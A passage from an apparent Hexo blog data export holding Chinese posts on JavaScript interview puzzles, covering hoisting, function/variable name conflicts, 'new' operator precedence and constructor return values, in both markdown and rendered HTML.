class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\">x,y,z</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">x</span>(<span class=\"params\"></span>)</span>&#123;&#125;;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(x);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">foo(<span class=\"number\">100</span>);</span><br></pre></td></tr></table></figure>\n<p>输出结果：function (){}，因为命名冲突时函数声明命名会覆盖函数形参。</p>\n<ul>\n<li>变量声明命名冲突时不会覆盖函数形参或者函数声明：</li>\n</ul>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">foo</span>(<span class=\"params\">x, y, z</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> func;</span><br><span class=\"line\">\t<span class=\"built_in\">console</span>.log(func);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">func();</span><br></pre></td></tr></table></figure>\n<p>输出结果：function func(){},理由如上。</p>\n<h3 id=\"2-代码执行阶段：\"><a href=\"#2-代码执行阶段：\" class=\"headerlink\" title=\"2.代码执行阶段：\"></a>2.代码执行阶段：</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">VO(test) = &#123;</span><br><span class=\"line\">\ta: <span class=\"number\">10</span>,</span><br><span class=\"line\">\tb: <span class=\"number\">20</span>,</span><br><span class=\"line\">\tc: <span class=\"number\">10</span>,</span><br><span class=\"line\">\td: <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">ref</span> <span class=\"attr\">to</span> <span class=\"attr\">func</span> '<span class=\"attr\">d</span>'&gt;</span>,</span><br><span class=\"line\">\te: function _e()&#123;&#125;;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\">``` </span><br><span class=\"line\"> </span><br><span class=\"line\">附赠一题练习题：</span><br><span class=\"line\"></span><br><span class=\"line\">```javascript\t</span><br><span class=\"line\">console.log(x);</span><br><span class=\"line\">var x = 10;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(x);</span><br><span class=\"line\">x = 20;</span><br><span class=\"line\"></span><br><span class=\"line\">function x()&#123;&#125;</span><br><span class=\"line\">console.log(x);</span><br><span class=\"line\"></span><br><span class=\"line\">if(true)&#123;</span><br><span class=\"line\">    var a = 1;</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    var b = true;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">console.log(a);</span><br><span class=\"line\">console.log(b);</span></span><br></pre></td></tr></table></figure>\n<p>输出结果：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function()&#123;&#125;</span><br><span class=\"line\">10</span><br><span class=\"line\">20</span><br><span class=\"line\">1</span><br><span class=\"line\">undefined</span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"「前端 · 面试」记录一些有意思的题目(二)","date":"2016-02-23T04:00:00.000Z","author":"Lindz","header-img":"img/5.jpg","_content":"\n> 本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n\n## 输出下面程序题的结果：\n\n```javascript\nfunction Foo() {\n    getName = function () { alert (1); };\n    return this;\n}\nFoo.getName = function () { alert (2);};\nFoo.prototype.getName = function () { alert (3);};\nvar getName = function () { alert (4);};\nfunction getName() { alert (5);}\n\n//请写出以下输出结果：\nFoo.getName();\ngetName();\nFoo().getName();\ngetName();\nnew Foo.getName();\nnew Foo().getName();\nnew new Foo().getName();\n```\n\n先来理解下题目，首先创建了一个Foo()函数，然后在给Foo函数增添一个函数属性getName,在Foo原型上增添一个getName函数属性，然后再以函数表达式和函数声明分别创建了一个同名函数getName。  \n\n#### 第一问：Foo.getName()返回2。  \n\n#### 第二问：首先需要知道函数表达式和函数声明的区别。\n\n> 函数声明具有变量声明提升(即所有声明变量或声明函数都会被提升到当前函数的顶部)\n\n例：\n\n```javascript\t\nconsole.log('x' in window);\nconsole.log(typeof func);\nvar x = 0;\nfunction func(){}\n```\njs引擎会将其解析为：\n\n```javascript\nvar x;\nfunction func(){}\nconsole.log('x' in window);    //true\nconsole.log(typeof func);      //function\nx = 0;\n```\n如果能明白的话就能理解下面代码的输出： \n\n```javascript\nconsole.log(x);     //function(){}\nvar x = 1;          \nconsole.log(x);     //1\nfunction x(){}\nconsole.log(x);     //1\n```\n所以js引擎在解析代码时候就变成了：\n\n```javascript\n//省略部分代码\nfunction Foo() {\n    getName = function () { alert (1); };\n    return this;\n}\nvar getName;\nfunction getName() { alert (5);}\ngetName = function () { alert (4);};\n\ngetName();       //4\n```\n后面函数表达式的赋值将前面的getName值个覆盖了，所以第二问输出4。\n\n#### 第三问：首先执行Foo()函数，并执行getName的赋值语句。\n> 它会查找当前作用域上是否存在这个变量，如果没有就向它上层作用域继续寻找，直到找到window全局作用域，若还是没有则在全局作用域上创建getName变量，  \n\n因为window域中存在着getName这个变量即(var getName = function () { alert (4);};)，所以将其替换为(getName = function () { alert (1); };)\n并返回window对象，所以Foo().getName()的结果为1；\n\n若代码改为：\n\n```javascript\nfunction Foo() {\n    var getName = function () { alert (1); };\n    return this;\n}\nFoo().getName();     //TypeError: Foo().getName is not a function. \n```\n创建getName时候多加一个var，即在当前作用域中添加一个局部变量getName，而在执行完毕后该局部变量就会被回收，并且该函数返回window全局对象，故在访问window中的getName会报错，因为没有创建window对象无此变量。\n\n#### 第四问：正如上一问，因为全局作用于window中getName被替换。  \n即(getName = function () { alert (1); };)\n故此时getName();输出结果为1。\n\n#### 第五问 new Foo.getName(); ,此处考察的是js的运算符优先级问题。\n\n根据图中优先级的描述：  \n![优先级](/assets/2016-02-23-record-front-questions/1.png)  \n可以得知：可以得知点（.）的优先级高于new操作，所以原式相当于是：\n\n```javascript\nnew (Foo.getName)();\n```\n所以结果为2；\n\n#### 第六问 new Foo().getName()\n\n根据表的执行结果为：(new Foo()).getName();\n### 所以接下来先讨论一下js构造函数返回值的问题：\n\njs返回值分为三类：  \n1、没有返回值则创建一个空对象，并把函数中与this绑定的属性添加；\n\n```javascript\nfunction F(){ this.name = 'foo';}\nvar obj = new F();   // obj: {name:'foo'} 创建一个对象，并绑定函数中this所绑定的属性\n```\n2、若有返回值则检查返回值的类型，若返回值为非引用类型，比如基本类型:(string,number,boolean,null,undefined)，则js引擎会忽略该返回值，并且创建一个新对象，并把函数中与this绑定的属性添加；\n\n```javascript\nfunction F(){ this.name = 'foo'; return true;}\nvar obj = new F();   // obj: {name:'foo'} 创建一个对象，并绑定函数中this所绑定的属性\n```\n3、若返回值是引用类型，则实际返回值为这个引用类型。\n\n```javascript\nfunction F(){this.name = 'foo'; return {x:1};}\nvar obj = new F();    //obj: {x:1}\n```\n如果理解这些，再来看下面一个例子：\n\n```javascript\nvar obj;\nfunction F1(){this.name = 'foo'; return 'a';}\nobj = new F1();    //obj: F1{name: 'foo'}\n\nfunction F2(){this.name = 'foo'; return String('a');}\nobj = new F2();    //obj: F2{name: 'foo'}\n\nfunction F3(){this.name = 'foo'; return new String('a');}\nobj = new F3();    //obj: String {0: \"a\", length: 1}\n\n```\n从例子中我们可以得出：无论 ‘a’还是String('a')创建的都是基本类型值，而new String('a')则创建一个字符串包装对象。\n\n原题中，返回的是this，而this在构造函数中本来就代表当前实例化对象。  \n之后调用实例化对象的getName函数，因为在Foo构造函数中没有为实例化对象添加任何属性，遂到当前对象的原型对象（prototype）中寻找getName，故最终输出3。\n\n#### 第七问：new new Foo().getName(); 同样是运算符优先级问题。\n执行结果为：new ((new Foo()).getName)();  \n先初始化Foo的实例化对象，然后将其原型上的getName函数作为构造函数再次new，故最终结果为3\n","source":"_posts/2016-02-23-record-front-questions.md","raw":"---\nlayout:     post\ntitle:      \"「前端 · 面试」记录一些有意思的题目(二)\"\ndate:       2016-02-23 12:00:00\nauthor:     \"Lindz\"\nheader-img: \"img/5.jpg\"\ntags:\n    - 面试\n---\n\n> 本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：[林东洲的博客 Lindz Blog](http://www.happylindz.com)。\n\n\n## 输出下面程序题的结果：\n\n```javascript\nfunction Foo() {\n    getName = function () { alert (1); };\n    return this;\n}\nFoo.getName = function () { alert (2);};\nFoo.prototype.getName = function () { alert (3);};\nvar getName = function () { alert (4);};\nfunction getName() { alert (5);}\n\n//请写出以下输出结果：\nFoo.getName();\ngetName();\nFoo().getName();\ngetName();\nnew Foo.getName();\nnew Foo().getName();\nnew new Foo().getName();\n```\n\n先来理解下题目，首先创建了一个Foo()函数，然后在给Foo函数增添一个函数属性getName,在Foo原型上增添一个getName函数属性，然后再以函数表达式和函数声明分别创建了一个同名函数getName。  \n\n#### 第一问：Foo.getName()返回2。  \n\n#### 第二问：首先需要知道函数表达式和函数声明的区别。\n\n> 函数声明具有变量声明提升(即所有声明变量或声明函数都会被提升到当前函数的顶部)\n\n例：\n\n```javascript\t\nconsole.log('x' in window);\nconsole.log(typeof func);\nvar x = 0;\nfunction func(){}\n```\njs引擎会将其解析为：\n\n```javascript\nvar x;\nfunction func(){}\nconsole.log('x' in window);    //true\nconsole.log(typeof func);      //function\nx = 0;\n```\n如果能明白的话就能理解下面代码的输出： \n\n```javascript\nconsole.log(x);     //function(){}\nvar x = 1;          \nconsole.log(x);     //1\nfunction x(){}\nconsole.log(x);     //1\n```\n所以js引擎在解析代码时候就变成了：\n\n```javascript\n//省略部分代码\nfunction Foo() {\n    getName = function () { alert (1); };\n    return this;\n}\nvar getName;\nfunction getName() { alert (5);}\ngetName = function () { alert (4);};\n\ngetName();       //4\n```\n后面函数表达式的赋值将前面的getName值个覆盖了，所以第二问输出4。\n\n#### 第三问：首先执行Foo()函数，并执行getName的赋值语句。\n> 它会查找当前作用域上是否存在这个变量，如果没有就向它上层作用域继续寻找，直到找到window全局作用域，若还是没有则在全局作用域上创建getName变量，  \n\n因为window域中存在着getName这个变量即(var getName = function () { alert (4);};)，所以将其替换为(getName = function () { alert (1); };)\n并返回window对象，所以Foo().getName()的结果为1；\n\n若代码改为：\n\n```javascript\nfunction Foo() {\n    var getName = function () { alert (1); };\n    return this;\n}\nFoo().getName();     //TypeError: Foo().getName is not a function. \n```\n创建getName时候多加一个var，即在当前作用域中添加一个局部变量getName，而在执行完毕后该局部变量就会被回收，并且该函数返回window全局对象，故在访问window中的getName会报错，因为没有创建window对象无此变量。\n\n#### 第四问：正如上一问，因为全局作用于window中getName被替换。  \n即(getName = function () { alert (1); };)\n故此时getName();输出结果为1。\n\n#### 第五问 new Foo.getName(); ,此处考察的是js的运算符优先级问题。\n\n根据图中优先级的描述：  \n![优先级](/assets/2016-02-23-record-front-questions/1.png)  \n可以得知：可以得知点（.）的优先级高于new操作，所以原式相当于是：\n\n```javascript\nnew (Foo.getName)();\n```\n所以结果为2；\n\n#### 第六问 new Foo().getName()\n\n根据表的执行结果为：(new Foo()).getName();\n### 所以接下来先讨论一下js构造函数返回值的问题：\n\njs返回值分为三类：  \n1、没有返回值则创建一个空对象，并把函数中与this绑定的属性添加；\n\n```javascript\nfunction F(){ this.name = 'foo';}\nvar obj = new F();   // obj: {name:'foo'} 创建一个对象，并绑定函数中this所绑定的属性\n```\n2、若有返回值则检查返回值的类型，若返回值为非引用类型，比如基本类型:(string,number,boolean,null,undefined)，则js引擎会忽略该返回值，并且创建一个新对象，并把函数中与this绑定的属性添加；\n\n```javascript\nfunction F(){ this.name = 'foo'; return true;}\nvar obj = new F();   // obj: {name:'foo'} 创建一个对象，并绑定函数中this所绑定的属性\n```\n3、若返回值是引用类型，则实际返回值为这个引用类型。\n\n```javascript\nfunction F(){this.name = 'foo'; return {x:1};}\nvar obj = new F();    //obj: {x:1}\n```\n如果理解这些，再来看下面一个例子：\n\n```javascript\nvar obj;\nfunction F1(){this.name = 'foo'; return 'a';}\nobj = new F1();    //obj: F1{name: 'foo'}\n\nfunction F2(){this.name = 'foo'; return String('a');}\nobj = new F2();    //obj: F2{name: 'foo'}\n\nfunction F3(){this.name = 'foo'; return new String('a');}\nobj = new F3();    //obj: String {0: \"a\", length: 1}\n\n```\n从例子中我们可以得出：无论 ‘a’还是String('a')创建的都是基本类型值，而new String('a')则创建一个字符串包装对象。\n\n原题中，返回的是this，而this在构造函数中本来就代表当前实例化对象。  \n之后调用实例化对象的getName函数，因为在Foo构造函数中没有为实例化对象添加任何属性，遂到当前对象的原型对象（prototype）中寻找getName，故最终输出3。\n\n#### 第七问：new new Foo().getName(); 同样是运算符优先级问题。\n执行结果为：new ((new Foo()).getName)();  \n先初始化Foo的实例化对象，然后将其原型上的getName函数作为构造函数再次new，故最终结果为3\n","slug":"2016-02-23-record-front-questions","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rww0008xmvdjrw0o3be","content":"<blockquote>\n<p>本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"输出下面程序题的结果：\"><a href=\"#输出下面程序题的结果：\" class=\"headerlink\" title=\"输出下面程序题的结果：\"></a>输出下面程序题的结果：</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">1</span>); &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Foo.getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">2</span>);&#125;;</span><br><span class=\"line\">Foo.prototype.getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">3</span>);&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">4</span>);&#125;;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getName</span>(<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">5</span>);&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//请写出以下输出结果：</span></span><br><span class=\"line\">Foo.getName();</span><br><span class=\"line\">getName();</span><br><span class=\"line\">Foo().getName();</span><br><span class=\"line\">getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo.getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> Foo().getName();</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"keyword\">new</span> Foo().getName();</span><br></pre></td></tr></table></figure>\n<p>先来理解下题目，首先创建了一个Foo()函数，然后在给Foo函数增添一个函数属性getName,在Foo原型上增添一个getName函数属性，然后再以函数表达式和函数声明分别创建了一个同名函数getName。  </p>\n<h4 id=\"第一问：Foo-getName-返回2。\"><a href=\"#第一问：Foo-getName-返回2。\" class=\"headerlink\" title=\"第一问：Foo.getName()返回2。\"></a>第一问：Foo.getName()返回2。</h4><h4 id=\"第二问：首先需要知道函数表达式和函数声明的区别。\"><a href=\"#第二问：首先需要知道函数表达式和函数声明的区别。\" class=\"headerlink\" title=\"第二问：首先需要知道函数表达式和函数声明的区别。\"></a>第二问：首先需要知道函数表达式和函数声明的区别。</h4><blockquote>\n<p>函数声明具有变量声明提升(即所有声明变量或声明函数都会被提升到当前函数的顶部)</p>\n</blockquote>\n<p>例：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'x'</span> <span class=\"keyword\">in</span> <span class=\"built_in\">window</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> func);</span><br><span class=\"line\"><span class=\"keyword\">var</span> x = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;&#125;</span><br></pre></td></tr></table></figure>\n<p>js引擎会将其解析为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> x;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">func</span>(<span class=\"params\"></span>)</span>&#123;&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'x'</span> <span class=\"keyword\">in</span> <span class=\"built_in\">window</span>);    <span class=\"comment\">//true</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"keyword\">typeof</span> func);      <span class=\"comment\">//function</span></span><br><span class=\"line\">x = <span class=\"number\">0</span>;</span><br></pre></td></tr></table></figure>\n<p>如果能明白的话就能理解下面代码的输出： </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(x);     <span class=\"comment\">//function()&#123;&#125;</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> x = <span class=\"number\">1</span>;          </span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(x);     <span class=\"comment\">//1</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">x</span>(<span class=\"params\"></span>)</span>&#123;&#125;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(x);     <span class=\"comment\">//1</span></span><br></pre></td></tr></table></figure>\n<p>所以js引擎在解析代码时候就变成了：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//省略部分代码</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">1</span>); &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> getName;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getName</span>(<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">5</span>);&#125;</span><br><span class=\"line\">getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">4</span>);&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">getName();       <span class=\"comment\">//4</span></span><br></pre></td></tr></table></figure>\n<p>后面函数表达式的赋值将前面的getName值个覆盖了，所以第二问输出4。</p>\n<h4 id=\"第三问：首先执行Foo-函数，并执行getName的赋值语句。\"><a href=\"#第三问：首先执行Foo-函数，并执行getName的赋值语句。\" class=\"headerlink\" title=\"第三问：首先执行Foo()函数，并执行getName的赋值语句。\"></a>第三问：首先执行Foo()函数，并执行getName的赋值语句。</h4><blockquote>\n<p>它会查找当前作用域上是否存在这个变量，如果没有就向它上层作用域继续寻找，直到找到window全局作用域，若还是没有则在全局作用域上创建getName变量，  </p>\n</blockquote>\n<p>因为window域中存在着getName这个变量即(var getName = function () { alert (4);};)，所以将其替换为(getName = function () { alert (1); };)<br>并返回window对象，所以Foo().getName()的结果为1；</p>\n<p>若代码改为：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> getName = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123; alert (<span class=\"number\">1</span>); &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Foo().getName();     <span class=\"comment\">//TypeError: Foo().getName is not a function.</span></span><br></pre></td></tr></table></figure>\n<p>创建getName时候多加一个var，即在当前作用域中添加一个局部变量getName，而在执行完毕后该局部变量就会被回收，并且该函数返回window全局对象，故在访问window中的getName会报错，因为没有创建window对象无此变量。</p>\n<h4 id=\"第四问：正如上一问，因为全局作用于window中getName被替换。\"><a href=\"#第四问：正如上一问，因为全局作用于window中getName被替换。\" class=\"headerlink\" title=\"第四问：正如上一问，因为全局作用于window中getName被替换。\"></a>第四问：正如上一问，因为全局作用于window中getName被替换。</h4><p>即(getName = function () { alert (1); };)<br>故此时getName();输出结果为1。</p>\n<h4 id=\"第五问-new-Foo-getName-此处考察的是js的运算符优先级问题。\"><a href=\"#第五问-new-Foo-getName-此处考察的是js的运算符优先级问题。\" class=\"headerlink\" title=\"第五问 new Foo.getName(); ,此处考察的是js的运算符优先级问题。\"></a>第五问 new Foo.getName(); ,此处考察的是js的运算符优先级问题。</h4><p>根据图中优先级的描述：<br><img src=\"/assets/2016-02-23-record-front-questions/1.png\" alt=\"优先级\"><br>可以得知：可以得知点（.）的优先级高于new操作，所以原式相当于是：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> (Foo.getName)();</span><br></pre></td></tr></table></figure>\n<p>所以结果为2；</p>\n<h4 id=\"第六问-new-Foo-getName\"><a href=\"#第六问-new-Foo-getName\" class=\"headerlink\" title=\"第六问 new Foo().getName()\"></a>第六问 new Foo().getName()</h4><p>根据表的执行结果为：(new Foo()).getName();</p>\n<h3 id=\"所以接下来先讨论一下js构造函数返回值的问题：\"><a href=\"#所以接下来先讨论一下js构造函数返回值的问题：\" class=\"headerlink\" title=\"所以接下来先讨论一下js构造函数返回值的问题：\"></a>所以接下来先讨论一下js构造函数返回值的问题：</h3><p>js返回值分为三类：<br>1、没有返回值则创建一个空对象，并把函数中与this绑定的属性添加；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F</span>(<span class=\"params\"></span>)</span>&#123; <span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>;&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> F();   <span class=\"comment\">// obj: &#123;name:'foo'&#125; 创建一个对象，并绑定函数中this所绑定的属性</span></span><br></pre></td></tr></table></figure>\n<p>2、若有返回值则检查返回值的类型，若返回值为非引用类型，比如基本类型:(string,number,boolean,null,undefined)，则js引擎会忽略该返回值，并且创建一个新对象，并把函数中与this绑定的属性添加；</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F</span>(<span class=\"params\"></span>)</span>&#123; <span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>; <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> F();   <span class=\"comment\">// obj: &#123;name:'foo'&#125; 创建一个对象，并绑定函数中this所绑定的属性</span></span><br></pre></td></tr></table></figure>\n<p>3、若返回值是引用类型，则实际返回值为这个引用类型。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>; <span class=\"keyword\">return</span> &#123;x:<span class=\"number\">1</span>&#125;;&#125;</span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> F();    <span class=\"comment\">//obj: &#123;x:1&#125;</span></span><br></pre></td></tr></table></figure>\n<p>如果理解这些，再来看下面一个例子：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F1</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>; <span class=\"keyword\">return</span> <span class=\"string\">'a'</span>;&#125;</span><br><span class=\"line\">obj = <span class=\"keyword\">new</span> F1();    <span class=\"comment\">//obj: F1&#123;name: 'foo'&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F2</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>; <span class=\"keyword\">return</span> <span class=\"built_in\">String</span>(<span class=\"string\">'a'</span>);&#125;</span><br><span class=\"line\">obj = <span class=\"keyword\">new</span> F2();    <span class=\"comment\">//obj: F2&#123;name: 'foo'&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">F3</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">this</span>.name = <span class=\"string\">'foo'</span>; <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"built_in\">String</span>(<span class=\"string\">'a'</span>);&#125;</span><br><span class=\"line\">obj = <span class=\"keyword\">new</span> F3();    <span class=\"comment\">//obj: String &#123;0: \"a\", length: 1&#125;</span></span><br></pre></td></tr></table></figure>\n<p>从例子中我们可以得出：无论 ‘a’还是String(‘a’)创建的都是基本类型值，而new 